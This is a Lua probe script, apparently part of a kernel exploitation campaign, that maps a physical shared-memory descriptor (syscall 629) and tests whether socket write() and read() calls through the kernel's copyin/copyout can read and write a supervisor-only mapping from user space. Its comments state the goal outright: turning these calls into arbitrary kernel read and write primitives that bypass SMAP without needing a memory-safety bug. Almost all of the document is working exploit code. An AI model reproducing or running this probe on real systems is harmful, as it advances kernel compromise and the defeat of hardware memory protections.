-- CRASH_CLASS: LOW
-- PROBE 1240a: the physhm mapping, attacked with copyin/copyout instead of a direct load
--
-- 315a/321a mmap'd the descriptor 629(1,2,*,0..3) returns, got a real user VA back
-- (0x310F10000), and the process died the moment it tried to LOAD from that address.
-- A user load checks the U/S bit of the PTE and faults; the kernel's copyin/copyout do
-- not - they only range-check the pointer against 0x800000000000 and disable SMAP. So a
-- mapping that is present-but-supervisor is unreadable from ring 3 and perfectly readable
-- from ring 0. If that is what this mapping is, write(sock, addr, n) is a read primitive
-- and read(sock, addr, n) is a write primitive, with no memory-safety bug at all.
--
-- Everything here stays inside pcall; nothing in this probe loads from the mapping.
print("=== PROBE 1240a: physhm through copyin and copyout ===")
local function N(v) if type(v)=="table" and v.tonumber then return v:tonumber() end if type(v)=="table" and v.h then return v.h*4294967296+v.l end return tonumber(v) or 0 end
local function mk(n) local t={} for k,v in pairs(syscall.pipe) do t[k]=v end t.syscall_no=n setmetatable(t,getmetatable(syscall.pipe)) return t end
local function ES() local ok,s=pcall(function() return get_error_string() end) if ok then return tostring(s) end return "?" end
local function rq(a) local ok,v=pcall(function() return memory.read_qword(uint64(a)) end) if ok then return N(v) end return -1 end
local function rby(a) local ok,v=pcall(function() return N(memory.read_byte(uint64(a))) end) if ok then return v end return -1 end
local function wd(a,v) pcall(function() memory.write_dword(uint64(a),uint64(v)) end) end
local function wq(a,v) pcall(function() memory.write_qword(uint64(a),uint64(v)) end) end
local function hex(buf,n)
  local t={}
  for i=0,n-1 do local b=rby(buf+i) if b<0 then t[#t+1]="??" else t[#t+1]=string.format("%02X",b) end end
  return table.concat(t," ")
end
print(string.format("[0] pid=%d", N(mk(20)())))
local sv = memory.alloc(8) wd(sv,0) wd(sv+4,0)
local rok = pcall(function() mk(135)(uint64(1),uint64(1),uint64(0),uint64(sv)) end)
local s1 = N(memory.read_dword(sv)); local s2 = N(memory.read_dword(sv+4))
print(string.format("    socketpair ok=%s -> %d %d", tostring(rok), s1, s2))
local mark = memory.alloc(0x40)
for i=0,0x3F do pcall(function() memory.write_byte(mark+i, 0xC0+i) end) end
local function addrof(t) local s=tostring(t) local m=s:match("0x(%x+)") if m then return tonumber(m,16) end return N(t) end
local marka = addrof(mark)
local out = memory.alloc(0x100)
local outa = addrof(out)
print("[A] control: write(sock, marker, 0x20) then read back")
local w = mk(4)
local r = mk(3)
local ok1, rv1 = pcall(function() return w(uint64(s1),uint64(marka),uint64(0x20),uint64(0),uint64(0),uint64(0)) end)
local e1 = ES()
local ok2, rv2 = pcall(function() return r(uint64(s2),uint64(outa),uint64(0x20),uint64(0x80),uint64(0),uint64(0)) end)
print(string.format("    write rv=%d err=%s | recv rv=%d err=%s | %s", N(rv1), e1, N(rv2), ES(), hex(outa,0x20)))
print("[B] physhm_open 629(1,2,0,0..3)")
local fds = {}
for a3=0,3 do
  local ok, rv = pcall(function() return mk(629)(uint64(1),uint64(2),uint64(0),uint64(a3),uint64(0),uint64(0)) end)
  local v = -1 if ok then v = N(rv) end
  print(string.format("    629(1,2,0,%d) -> %d err=%s", a3, v, ES()))
  if v > 0 then fds[#fds+1] = v end
end
if #fds == 0 then print("[!] no descriptor - stopping") print("=== DONE 1240a ===") return end
local fd = fds[1]
print(string.format("    using fd %d", fd))
print("[C] mmap the descriptor at several offsets, then copyin from it")
local combos = { {1,0}, {2,0}, {1,0x1000}, {1,0x2000}, {1,0x100000}, {1,0x10000000} }
for i=1,#combos do
  local flags, off = combos[i][1], combos[i][2]
  local okm, b = pcall(function() return mk(477)(uint64(0),uint64(0x4000),uint64(3),uint64(flags),uint64(fd),uint64(off)) end)
  local base = -1 if okm then base = N(b) end
  print(string.format("    flags=%d off=0x%X -> base=0x%X err=%s", flags, off, base, ES()))
  if base ~= -1 and base > 0 and base < 0x800000000000 then
    for k=0,0x3F,8 do wd(outa+k,0) end
    local okw, rvw = pcall(function() return w(uint64(s1),uint64(base),uint64(0x20),uint64(0),uint64(0),uint64(0)) end)
    local ew = ES()
    print(string.format("      copyin write(s1, 0x%X, 0x20) rv=%d err=%s", base, N(rvw), ew))
    local okr, rvr = pcall(function() return r(uint64(s2),uint64(outa),uint64(0x20),uint64(0x80),uint64(0),uint64(0)) end)
    print(string.format("      recv rv=%d err=%s | %s", N(rvr), ES(), hex(outa,0x20)))
  end
end
print("[D] copyout into the mapping: queue 0x10 bytes, read(s1, base, 0x10)")
local q = memory.alloc(0x20)
for k=0,0x0F do pcall(function() memory.write_byte(q+k, 0xE0+k) end) end
local qa = addrof(q)
local okw2, rvw2 = pcall(function() return w(uint64(s2),uint64(qa),uint64(0x10),uint64(0),uint64(0),uint64(0)) end)
print(string.format("    queue write rv=%d err=%s", N(rvw2), ES()))
local okm2, b2 = pcall(function() return mk(477)(uint64(0),uint64(0x4000),uint64(3),uint64(1),uint64(fd),uint64(0)) end)
local base2 = -1 if okm2 then base2 = N(b2) end
print(string.format("    base2=0x%X err=%s", base2, ES()))
if base2 ~= -1 and base2 > 0 and base2 < 0x800000000000 then
  local okr2, rvr2 = pcall(function() return r(uint64(s1),uint64(base2),uint64(0x10),uint64(0),uint64(0),uint64(0)) end)
  print(string.format("    read into mapping rv=%d err=%s", N(rvr2), ES()))
end
print("=== DONE 1240a ===")
